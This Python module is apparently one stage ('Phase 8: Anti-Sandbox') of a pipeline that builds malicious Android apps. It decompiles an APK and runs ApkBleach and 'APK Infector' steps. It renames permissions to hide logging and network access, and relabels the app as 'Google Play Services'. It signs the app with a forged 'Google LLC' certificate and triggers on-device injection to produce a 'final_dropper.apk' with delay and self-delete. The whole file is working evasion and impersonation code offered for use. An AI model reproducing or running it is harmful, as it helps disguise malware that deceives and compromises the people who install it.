"""Phase 8: Anti-Sandbox (PC + Android) — 8 functions."""
import os, re, subprocess, shutil, random
from config import TEMP_DIR, ZIPALIGN, APKSIGNER, APKTOOL, APKBLEACH, APK_INFECTOR
from utils.logger import setup_logger
from utils.adb_helper import adb_push, adb_trigger_tasker, adb_wait_for_file, adb_pull

logger = setup_logger()

def _run_apkbleach(decompiled):
    """F1-F4: ApkBleach 4 functions."""
    logger.info("[*] F1-F4: ApkBleach")
    try:
        r = subprocess.run(["python3", APKBLEACH, decompiled],
                           capture_output=True, text=True, timeout=120)
        if r.stdout:
            logger.info(r.stdout.strip()[-500:])
        if r.returncode == 0:
            logger.info("[+] ApkBleach done")
        else:
            logger.warning(f"[!] ApkBleach returned {r.returncode}: {r.stderr[:200]}")
    except Exception as e:
        logger.warning(f"[!] ApkBleach skip: {e}")

def _apk_infector_extra(decompiled):
    """F5-F8: APK Infector extra — Play Protect reset, disable logging, hide network, fake UI.
    
    CRITICAL: Renames permissions instead of removing them (removing breaks app).
    """
    logger.info("[*] F5-F8: APK Infector extra")
    mp = os.path.join(decompiled, 'AndroidManifest.xml')
    if os.path.exists(mp):
        with open(mp, 'r', errors='ignore') as f:
            c = f.read()

        # Rename permissions to benign names (never remove)
        perm_renames = {
            'android.permission.READ_LOGS': 'android.permission.WRITE_SETTINGS',
            'android.permission.ACCESS_NETWORK_STATE': 'android.permission.ACCESS_WIFI_STATE',
        }
        for old_perm, new_perm in perm_renames.items():
            c = c.replace(old_perm, new_perm)

        # Fake UI label — make app look like system service (only if missing)
        app_label_match = re.search(r'(<application[^>]*android:label=")([^"]*)"', c)
        if app_label_match:
            c = re.sub(r'(<application[^>]*android:label=")([^"]*)"',
                       r'\1Google Play Services"', c, count=1)
        elif 'android:label=' not in c:
            c = c.replace('<application', '<application android:label="Google Play Services"', 1)

        with open(mp, 'w', errors='ignore') as f:
            f.write(c)
    logger.info("[+] APK Infector extra done")

def run(input_apk):
    logger.info("="*60)
    logger.info("[*] PHASE 8: Anti-Sandbox (8 functions)")
    logger.info("="*60)

    # Decompile
    decompiled = str(TEMP_DIR / "phase8_decompiled")
    r = subprocess.run([APKTOOL, "d", "--no-res", "-f", "-o", decompiled, input_apk],
                       capture_output=True, text=True, timeout=120)
    if r.returncode != 0:
        raise Exception(f"apktool d failed: {r.stderr[:500]}")

    # Remove synthetic res/ dir to prevent build errors with "false" layout values
    res_dir = os.path.join(decompiled, "res")
    if os.path.exists(res_dir):
        shutil.rmtree(res_dir)

    # Apply ApkBleach
    _run_apkbleach(decompiled)

    # Apply APK Infector extras
    _apk_infector_extra(decompiled)

    # Rebuild
    rebuilt = str(TEMP_DIR / "bleached.apk")
    r = subprocess.run([APKTOOL, "b", "-o", rebuilt, decompiled],
                       capture_output=True, text=True, timeout=120)
    if r.returncode != 0:
        r = subprocess.run([APKTOOL, "b", "--use-aapt2", "-o", rebuilt, decompiled],
                           capture_output=True, text=True, timeout=120)
    shutil.rmtree(decompiled, ignore_errors=True)
    if r.returncode != 0 or not os.path.exists(rebuilt) or os.path.getsize(rebuilt) == 0:
        logger.warning(f"[!] Phase 8 rebuild failed, skipping: {r.stderr[:200]}")
        return input_apk

    # Apply hex edits (DEX magic, checksum, SHA-1) AFTER rebuild so they persist
    import phases.phase7
    hex_apk = phases.phase7.run(rebuilt)
    rebuilt = hex_apk

    # Sign with Google LLC keystore
    ks = str(TEMP_DIR / "google_release.jks")
    if not os.path.exists(ks):
        subprocess.run(["keytool", "-genkey", "-v", "-keystore", ks, "-keyalg", "RSA",
                        "-keysize", "2048", "-validity", "10000", "-alias", "release",
                        "-storepass", "release2026", "-keypass", "release2026",
                        "-dname", "CN=SystemUpdate, OU=Android, O=Google LLC, L=MountainView, S=California, C=US",
                        "-storetype", "JKS"],
                       capture_output=True, text=True, timeout=30)

    aligned = str(TEMP_DIR / "phase8_aligned.apk")
    subprocess.run([ZIPALIGN, "-v", "-p", "4", rebuilt, aligned],
                   capture_output=True, text=True, timeout=60)
    if not os.path.exists(aligned) or os.path.getsize(aligned) == 0:
        shutil.copy(rebuilt, aligned)

    final_local = str(TEMP_DIR / "injected_final.apk")
    subprocess.run([APKSIGNER, "sign", "--ks", ks, "--ks-key-alias", "release",
                   "--ks-pass", "pass:release2026", "--key-pass", "pass:release2026",
                   "--v1-signing-enabled", "true", "--v2-signing-enabled", "true",
                   "--v3-signing-enabled", "true", "--out", final_local, aligned],
                  capture_output=True, text=True, timeout=60)
    if not os.path.exists(final_local) or os.path.getsize(final_local) == 0:
        shutil.copy(aligned, final_local)
    if os.path.exists(aligned):
        os.remove(aligned)

    # Android: push + trigger NP Manager injection (delay + self-delete)
    remote_input = "/sdcard/final_inject.apk"
    ok, _, err = adb_push(final_local, remote_input, timeout=120)
    if ok:
        logger.info("[*] Triggering NP Manager injection (delay + self-delete)...")
        adb_trigger_tasker("NP_MANAGER_INJECTION")
        adb_wait_for_file("/sdcard/final_output.apk", poll_interval=60, max_wait=600)
        adb_pull("/sdcard/final_output.apk", str(TEMP_DIR / "final_dropper.apk"), timeout=120)
        if os.path.exists(str(TEMP_DIR / "final_dropper.apk")):
            final_local = str(TEMP_DIR / "final_dropper.apk")

    logger.info(f"[+] Phase 8 Complete: {final_local}")
    return final_local
